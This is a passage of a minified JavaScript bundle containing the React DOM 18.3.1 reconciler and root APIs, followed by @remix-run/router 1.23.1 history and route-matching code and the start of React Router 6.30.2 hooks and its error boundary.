e;case 14:n=Ki(null,n,s,Ne(s.type,e),t);break e}throw Error(b(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ne(s,r),Fa(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ne(s,r),qi(e,n,s,r,t);case 3:e:{if(pu(n),e===null)throw Error(b(387));s=n.pendingProps,a=n.memoizedState,r=a.element,zc(e,n),sr(n,s,null,t);var l=n.memoizedState;if(s=l.element,a.isDehydrated)if(a={element:s,isDehydrated:!1,cache:l.cache,pendingSuspenseBoundaries:l.pendingSuspenseBoundaries,transitions:l.transitions},n.updateQueue.baseState=a,n.memoizedState=a,n.flags&256){r=ut(Error(b(423)),n),n=Zi(e,n,s,t,r);break e}else if(s!==r){r=ut(Error(b(424)),n),n=Zi(e,n,s,t,r);break e}else for(ve=un(n.stateNode.containerInfo.firstChild),ye=n,B=!0,Re=null,t=Ic(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(it(),s===r){n=qe(e,n,t);break e}ie(e,n,s,t)}n=n.child}return n;case 5:return Bc(n),e===null&&Ma(n),s=n.type,r=n.pendingProps,a=e!==null?e.memoizedProps:null,l=r.children,Na(s,r)?l=null:a!==null&&Na(s,a)&&(n.flags|=32),uu(e,n),ie(e,n,l,t),n.child;case 6:return e===null&&Ma(n),null;case 13:return du(e,n,t);case 4:return Ol(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=ot(n,null,s,t):ie(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ne(s,r),Yi(e,n,s,r,t);case 7:return ie(e,n,n.pendingProps,t),n.child;case 8:return ie(e,n,n.pendingProps.children,t),n.child;case 12:return ie(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,a=n.memoizedProps,l=r.value,I(nr,s._currentValue),s._currentValue=l,a!==null)if(Me(a.value,l)){if(a.children===r.children&&!he.current){n=qe(e,n,t);break e}}else for(a=n.child,a!==null&&(a.return=n);a!==null;){var i=a.dependencies;if(i!==null){l=a.child;for(var o=i.firstContext;o!==null;){if(o.context===s){if(a.tag===1){o=Ge(-1,t&-t),o.tag=2;var u=a.updateQueue;if(u!==null){u=u.shared;var g=u.pending;g===null?o.next=o:(o.next=g.next,g.next=o),u.pending=o}}a.lanes|=t,o=a.alternate,o!==null&&(o.lanes|=t),Ia(a.return,t,n),i.lanes|=t;break}o=o.next}}else if(a.tag===10)l=a.type===n.type?null:a.child;else if(a.tag===18){if(l=a.return,l===null)throw Error(b(341));l.lanes|=t,i=l.alternate,i!==null&&(i.lanes|=t),Ia(l,t,n),l=a.sibling}else l=a.child;if(l!==null)l.return=a;else for(l=a;l!==null;){if(l===n){l=null;break}if(a=l.sibling,a!==null){a.return=l.return,l=a;break}l=l.return}a=l}ie(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,st(n,t),r=_e(r),s=s(r),n.flags|=1,ie(e,n,s,t),n.child;case 14:return s=n.type,r=Ne(s,n.pendingProps),r=Ne(s.type,r),Ki(e,n,s,r,t);case 15:return ou(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:Ne(s,r),zs(e,n),n.tag=1,fe(s)?(e=!0,Xs(n)):e=!1,st(n,t),au(n,s,r),za(n,s,r,t),Ua(null,n,s,!0,e,t);case 19:return hu(e,n,t);case 22:return cu(e,n,t)}throw Error(b(156,n.tag))};function Lu(e,n){return tc(e,n)}function fh(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ee(e,n,t,s){return new fh(e,n,t,s)}function Gl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function mh(e){if(typeof e=="function")return Gl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===pl)return 11;if(e===dl)return 14}return 2}function fn(e,n){var t=e.alternate;return t===null?(t=Ee(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Us(e,n,t,s,r,a){var l=2;if(s=e,typeof e=="function")Gl(e)&&(l=1);else if(typeof e=="string")l=5;else e:switch(e){case Hn:return On(t.children,r,a,n);case ul:l=8,r|=8;break;case oa:return e=Ee(12,t,n,r|2),e.elementType=oa,e.lanes=a,e;case ca:return e=Ee(13,t,n,r),e.elementType=ca,e.lanes=a,e;case ua:return e=Ee(19,t,n,r),e.elementType=ua,e.lanes=a,e;case Bo:return Er(t,r,a,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Do:l=10;break e;case zo:l=9;break e;case pl:l=11;break e;case dl:l=14;break e;case Je:l=16,s=null;break e}throw Error(b(130,e==null?e:typeof e,""))}return n=Ee(l,t,n,r),n.elementType=e,n.type=s,n.lanes=a,n}function On(e,n,t,s){return e=Ee(7,e,s,n),e.lanes=t,e}function Er(e,n,t,s){return e=Ee(22,e,s,n),e.elementType=Bo,e.lanes=t,e.stateNode={isHidden:!1},e}function ra(e,n,t){return e=Ee(6,e,null,n),e.lanes=t,e}function aa(e,n,t){return n=Ee(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function gh(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Br(0),this.expirationTimes=Br(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Br(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function Ql(e,n,t,s,r,a,l,i,o){return e=new gh(e,n,t,i,o),n===1?(n=1,a===!0&&(n|=8)):n=0,a=Ee(3,null,null,n),e.current=a,a.stateNode=e,a.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},Nl(a),e}function vh(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Un,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function Nu(e){if(!e)return vn;e=e._reactInternals;e:{if(zn(e)!==e||e.tag!==1)throw Error(b(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(fe(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(b(171))}if(e.tag===1){var t=e.type;if(fe(t))return Nc(e,t,n)}return n}function Ou(e,n,t,s,r,a,l,i,o){return e=Ql(t,s,!0,e,r,a,l,i,o),e.context=Nu(null),t=e.current,s=oe(),r=hn(t),a=Ge(s,r),a.callback=n??null,pn(t,a,r),e.current.lanes=r,as(e,r,s),me(e,s),e}function Tr(e,n,t,s){var r=n.current,a=oe(),l=hn(r);return t=Nu(t),n.context===null?n.context=t:n.pendingContext=t,n=Ge(a,l),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=pn(r,n,l),e!==null&&(je(e,r,l,a),Ms(e,r,l)),l}function pr(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function io(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function Yl(e,n){io(e,n),(e=e.alternate)&&io(e,n)}function yh(){return null}var Ru=typeof reportError=="function"?reportError:function(e){console.error(e)};function Kl(e){this._internalRoot=e}_r.prototype.render=Kl.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(b(409));Tr(e,n,null,null)};_r.prototype.unmount=Kl.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;In(function(){Tr(null,e,null,null)}),n[Ye]=null}};function _r(e){this._internalRoot=e}_r.prototype.unstable_scheduleHydration=function(e){if(e){var n=cc();e={blockedOn:null,target:e,priority:n};for(var t=0;t<nn.length&&n!==0&&n<nn[t].priority;t++);nn.splice(t,0,e),t===0&&pc(e)}};function ql(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Cr(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function oo(){}function kh(e,n,t,s,r){if(r){if(typeof s=="function"){var a=s;s=function(){var u=pr(l);a.call(u)}}var l=Ou(n,s,e,0,null,!1,!1,"",oo);return e._reactRootContainer=l,e[Ye]=l.current,Qt(e.nodeType===8?e.parentNode:e),In(),l}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var i=s;s=function(){var u=pr(o);i.call(u)}}var o=Ql(e,0,!1,null,null,!1,!1,"",oo);return e._reactRootContainer=o,e[Ye]=o.current,Qt(e.nodeType===8?e.parentNode:e),In(function(){Tr(n,o,t,s)}),o}function Pr(e,n,t,s,r){var a=t._reactRootContainer;if(a){var l=a;if(typeof r=="function"){var i=r;r=function(){var o=pr(l);i.call(o)}}Tr(n,l,e,r)}else l=kh(t,n,e,r,s);return pr(l)}ic=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=Pt(n.pendingLanes);t!==0&&(ml(n,t|1),me(n,G()),!(j&6)&&(pt=G()+500,wn()))}break;case 13:In(function(){var s=Ke(e,1);if(s!==null){var r=oe();je(s,e,1,r)}}),Yl(e,1)}};gl=function(e){if(e.tag===13){var n=Ke(e,134217728);if(n!==null){var t=oe();je(n,e,134217728,t)}Yl(e,134217728)}};oc=function(e){if(e.tag===13){var n=hn(e),t=Ke(e,n);if(t!==null){var s=oe();je(t,e,n,s)}Yl(e,n)}};cc=function(){return M};uc=function(e,n){var t=M;try{return M=e,n()}finally{M=t}};wa=function(e,n,t){switch(n){case"input":if(ha(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=yr(s);if(!r)throw Error(b(90));Uo(s),ha(s,r)}}}break;case"textarea":Vo(e,t);break;case"select":n=t.value,n!=null&&Jn(e,!!t.multiple,n,!1)}};qo=Vl;Zo=In;var wh={usingClientEntryPoint:!1,Events:[is,Gn,yr,Yo,Ko,Vl]},Tt={findFiberByHostInstance:Cn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},bh={bundleType:Tt.bundleType,version:Tt.version,rendererPackageName:Tt.rendererPackageName,rendererConfig:Tt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Ze.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=ec(e),e===null?null:e.stateNode},findFiberByHostInstance:Tt.findFiberByHostInstance||yh,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Ls=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Ls.isDisabled&&Ls.supportsFiber)try{fr=Ls.inject(bh),Be=Ls}catch{}}we.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=wh;we.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!ql(n))throw Error(b(200));return vh(e,n,null,t)};we.createRoot=function(e,n){if(!ql(e))throw Error(b(299));var t=!1,s="",r=Ru;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=Ql(e,1,!1,null,null,t,!1,s,r),e[Ye]=n.current,Qt(e.nodeType===8?e.parentNode:e),new Kl(n)};we.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(b(188)):(e=Object.keys(e).join(","),Error(b(268,e)));return e=ec(n),e=e===null?null:e.stateNode,e};we.flushSync=function(e){return In(e)};we.hydrate=function(e,n,t){if(!Cr(n))throw Error(b(200));return Pr(null,e,n,!0,t)};we.hydrateRoot=function(e,n,t){if(!ql(e))throw Error(b(405));var s=t!=null&&t.hydratedSources||null,r=!1,a="",l=Ru;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(a=t.identifierPrefix),t.onRecoverableError!==void 0&&(l=t.onRecoverableError)),n=Ou(n,null,e,1,t??null,r,!1,a,l),e[Ye]=n.current,Qt(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new _r(n)};we.render=function(e,n,t){if(!Cr(n))throw Error(b(200));return Pr(null,e,n,!1,t)};we.unmountComponentAtNode=function(e){if(!Cr(e))throw Error(b(40));return e._reactRootContainer?(In(function(){Pr(null,null,e,!1,function(){e._reactRootContainer=null,e[Ye]=null})}),!0):!1};we.unstable_batchedUpdates=Vl;we.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Cr(t))throw Error(b(200));if(e==null||e._reactInternals===void 0)throw Error(b(38));return Pr(e,n,t,!1,s)};we.version="18.3.1-next-f1338f8080-20240426";function Au(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Au)}catch(e){console.error(e)}}Au(),Ao.exports=we;var xh=Ao.exports,ju,co=xh;ju=co.createRoot,co.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ts(){return ts=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},ts.apply(this,arguments)}var an;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(an||(an={}));const uo="popstate";function Sh(e){e===void 0&&(e={});function n(s,r){let{pathname:a,search:l,hash:i}=s.location;return Ja("",{pathname:a,search:l,hash:i},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:dr(r)}return Th(n,t,null,e)}function Y(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function Zl(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Eh(){return Math.random().toString(36).substr(2,8)}function po(e,n){return{usr:e.state,key:e.key,idx:n}}function Ja(e,n,t,s){return t===void 0&&(t=null),ts({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?mt(n):n,{state:t,key:n&&n.key||s||Eh()})}function dr(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function mt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Th(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:a=!1}=s,l=r.history,i=an.Pop,o=null,u=g();u==null&&(u=0,l.replaceState(ts({},l.state,{idx:u}),""));function g(){return(l.state||{idx:null}).idx}function f(){i=an.Pop;let E=g(),d=E==null?null:E-u;u=E,o&&o({action:i,location:w.location,delta:d})}function m(E,d){i=an.Push;let p=Ja(w.location,E,d);u=g()+1;let h=po(p,u),y=w.createHref(p);try{l.pushState(h,"",y)}catch(S){if(S instanceof DOMException&&S.name==="DataCloneError")throw S;r.location.assign(y)}a&&o&&o({action:i,location:w.location,delta:1})}function v(E,d){i=an.Replace;let p=Ja(w.location,E,d);u=g();let h=po(p,u),y=w.createHref(p);l.replaceState(h,"",y),a&&o&&o({action:i,location:w.location,delta:0})}function k(E){let d=r.location.origin!=="null"?r.location.origin:r.location.href,p=typeof E=="string"?E:dr(E);return p=p.replace(/ $/,"%20"),Y(d,"No window.location.(origin|href) available to create URL for href: "+p),new URL(p,d)}let w={get action(){return i},get location(){return e(r,l)},listen(E){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(uo,f),o=E,()=>{r.removeEventListener(uo,f),o=null}},createHref(E){return n(r,E)},createURL:k,encodeLocation(E){let d=k(E);return{pathname:d.pathname,search:d.search,hash:d.hash}},push:m,replace:v,go(E){return l.go(E)}};return w}var ho;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(ho||(ho={}));function _h(e,n,t){return t===void 0&&(t="/"),Ch(e,n,t)}function Ch(e,n,t,s){let r=typeof n=="string"?mt(n):n,a=Xl(r.pathname||"/",t);if(a==null)return null;let l=Mu(e);Ph(l);let i=null;for(let o=0;i==null&&o<l.length;++o){let u=Fh(a);i=Dh(l[o],u)}return i}function Mu(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(a,l,i)=>{let o={relativePath:i===void 0?a.path||"":i,caseSensitive:a.caseSensitive===!0,childrenIndex:l,route:a};o.relativePath.startsWith("/")&&(Y(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let u=mn([s,o.relativePath]),g=t.concat(o);a.children&&a.children.length>0&&(Y(a.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),Mu(a.children,n,g,u)),!(a.path==null&&!a.index)&&n.push({path:u,score:Mh(u,a.index),routesMeta:g})};return e.forEach((a,l)=>{var i;if(a.path===""||!((i=a.path)!=null&&i.includes("?")))r(a,l);else for(let o of Iu(a.path))r(a,l,o)}),n}function Iu(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),a=t.replace(/\?$/,"");if(s.length===0)return r?[a,""]:[a];let l=Iu(s.join("/")),i=[];return i.push(...l.map(o=>o===""?a:[a,o].join("/"))),r&&i.push(...l),i.map(o=>e.startsWith("/")&&o===""?"/":o)}function Ph(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Ih(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Lh=/^:[\w-]+$/,Nh=3,Oh=2,Rh=1,Ah=10,jh=-2,fo=e=>e==="*";function Mh(e,n){let t=e.split("/"),s=t.length;return t.some(fo)&&(s+=jh),n&&(s+=Oh),t.filter(r=>!fo(r)).reduce((r,a)=>r+(Lh.test(a)?Nh:a===""?Rh:Ah),s)}function Ih(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Dh(e,n,t){let{routesMeta:s}=e,r={},a="/",l=[];for(let i=0;i<s.length;++i){let o=s[i],u=i===s.length-1,g=a==="/"?n:n.slice(a.length)||"/",f=zh({path:o.relativePath,caseSensitive:o.caseSensitive,end:u},g),m=o.route;if(!f)return null;Object.assign(r,f.params),l.push({params:r,pathname:mn([a,f.pathname]),pathnameBase:$h(mn([a,f.pathnameBase])),route:m}),f.pathnameBase!=="/"&&(a=mn([a,f.pathnameBase]))}return l}function zh(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Bh(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let a=r[0],l=a.replace(/(.)\/+$/,"$1"),i=r.slice(1);return{params:s.reduce((u,g,f)=>{let{paramName:m,isOptional:v}=g;if(m==="*"){let w=i[f]||"";l=a.slice(0,a.length-w.length).replace(/(.)\/+$/,"$1")}const k=i[f];return v&&!k?u[m]=void 0:u[m]=(k||"").replace(/%2F/g,"/"),u},{}),pathname:a,pathnameBase:l,pattern:e}}function Bh(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),Zl(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(l,i,o)=>(s.push({paramName:i,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function Fh(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return Zl(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function Xl(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const Uh=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Hh=e=>Uh.test(e);function Vh(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?mt(e):e,a;if(t)if(Hh(t))a=t;else{if(t.includes("//")){let l=t;t=t.replace(/\/\/+/g,"/"),Zl(!1,"Pathnames cannot have embedded double slashes - normalizing "+(l+" -> "+t))}t.startsWith("/")?a=mo(t.substring(1),"/"):a=mo(t,n)}else a=n;return{pathname:a,search:Gh(s),hash:Qh(r)}}function mo(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function la(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Wh(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Du(e,n){let t=Wh(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function zu(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=mt(e):(r=ts({},e),Y(!r.pathname||!r.pathname.includes("?"),la("?","pathname","search",r)),Y(!r.pathname||!r.pathname.includes("#"),la("#","pathname","hash",r)),Y(!r.search||!r.search.includes("#"),la("#","search","hash",r)));let a=e===""||r.pathname==="",l=a?"/":r.pathname,i;if(l==null)i=t;else{let f=n.length-1;if(!s&&l.startsWith("..")){let m=l.split("/");for(;m[0]==="..";)m.shift(),f-=1;r.pathname=m.join("/")}i=f>=0?n[f]:"/"}let o=Vh(r,i),u=l&&l!=="/"&&l.endsWith("/"),g=(a||l===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(u||g)&&(o.pathname+="/"),o}const mn=e=>e.join("/").replace(/\/\/+/g,"/"),$h=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Gh=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Qh=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function Yh(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Bu=["post","put","patch","delete"];new Set(Bu);const Kh=["get",...Bu];new Set(Kh);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ss(){return ss=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},ss.apply(this,arguments)}const Jl=x.createContext(null),qh=x.createContext(null),Bn=x.createContext(null),Lr=x.createContext(null),bn=x.createContext({outlet:null,matches:[],isDataRoute:!1}),Fu=x.createContext(null);function Zh(e,n){let{relative:t}=n===void 0?{}:n;cs()||Y(!1);let{basename:s,navigator:r}=x.useContext(Bn),{hash:a,pathname:l,search:i}=Vu(e,{relative:t}),o=l;return s!=="/"&&(o=l==="/"?s:mn([s,l])),r.createHref({pathname:o,search:i,hash:a})}function cs(){return x.useContext(Lr)!=null}function us(){return cs()||Y(!1),x.useContext(Lr).location}function Uu(e){x.useContext(Bn).static||x.useLayoutEffect(e)}function Hu(){let{isDataRoute:e}=x.useContext(bn);return e?df():Xh()}function Xh(){cs()||Y(!1);let e=x.useContext(Jl),{basename:n,future:t,navigator:s}=x.useContext(Bn),{matches:r}=x.useContext(bn),{pathname:a}=us(),l=JSON.stringify(Du(r,t.v7_relativeSplatPath)),i=x.useRef(!1);return Uu(()=>{i.current=!0}),x.useCallback(function(u,g){if(g===void 0&&(g={}),!i.current)return;if(typeof u=="number"){s.go(u);return}let f=zu(u,JSON.parse(l),a,g.relative==="path");e==null&&n!=="/"&&(f.pathname=f.pathname==="/"?n:mn([n,f.pathname])),(g.replace?s.replace:s.push)(f,g.state,g)},[n,s,l,a,e])}function Jh(){let{matches:e}=x.useContext(bn),n=e[e.length-1];return n?n.params:{}}function Vu(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=x.useContext(Bn),{matches:r}=x.useContext(bn),{pathname:a}=us(),l=JSON.stringify(Du(r,s.v7_relativeSplatPath));return x.useMemo(()=>zu(e,JSON.parse(l),a,t==="path"),[e,l,a,t])}function ef(e,n){return nf(e,n)}function nf(e,n,t,s){cs()||Y(!1);let{navigator:r}=x.useContext(Bn),{matches:a}=x.useContext(bn),l=a[a.length-1],i=l?l.params:{};l&&l.pathname;let o=l?l.pathnameBase:"/";l&&l.route;let u=us(),g;if(n){var f;let E=typeof n=="string"?mt(n):n;o==="/"||(f=E.pathname)!=null&&f.startsWith(o)||Y(!1),g=E}else g=u;let m=g.pathname||"/",v=m;if(o!=="/"){let E=o.replace(/^\//,"").split("/");v="/"+m.replace(/^\//,"").split("/").slice(E.length).join("/")}let k=_h(e,{pathname:v}),w=lf(k&&k.map(E=>Object.assign({},E,{params:Object.assign({},i,E.params),pathname:mn([o,r.encodeLocation?r.encodeLocation(E.pathname).pathname:E.pathname]),pathnameBase:E.pathnameBase==="/"?o:mn([o,r.encodeLocation?r.encodeLocation(E.pathnameBase).pathname:E.pathnameBase])})),a,t,s);return n&&w?x.createElement(Lr.Provider,{value:{location:ss({pathname:"/",search:"",hash:"",state:null,key:"default"},g),navigationType:an.Pop}},w):w}function tf(){let e=pf(),n=Yh(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return x.createElement(x.Fragment,null,x.createElement("h2",null,"Unexpected Application Error!"),x.createElement("h3",{style:{fontStyle:"italic"}},n),t?x.createElement("pre",{style:r},t):null,null)}const sf=x.createElement(tf,null);class rf extends x.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?x.createElement(bn.Provider,{value:this.props.routeContext},x.createElement(Fu.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function af(e){let{routeContext:n,match:t,children:s}=e,r=x.useContext(Jl);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),x.createElement(bn.Provider,{value:n},s)}function lf(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var a;if(!t)return null;if(t.errors)e=t.matches;else 